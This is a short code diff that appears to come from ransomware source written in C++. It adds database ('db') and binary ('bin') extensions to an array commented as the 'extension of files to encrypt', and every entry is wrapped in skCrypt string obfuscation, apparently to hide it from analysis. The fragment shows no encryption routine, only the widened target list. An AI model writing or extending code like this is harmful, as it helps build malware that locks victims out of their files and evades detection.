@@ -175,7 +175,9 @@ const std::string whitelist[] = {
 	(std::string)skCrypt("ai"),
 	(std::string)skCrypt("zip"),
 	(std::string)skCrypt("rar"),
-	(std::string)skCrypt("7z")
+	(std::string)skCrypt("7z"),
+	(std::string)skCrypt("db"),
+	(std::string)skCrypt("bin")
 }; // extension of files to encrypt
 
 
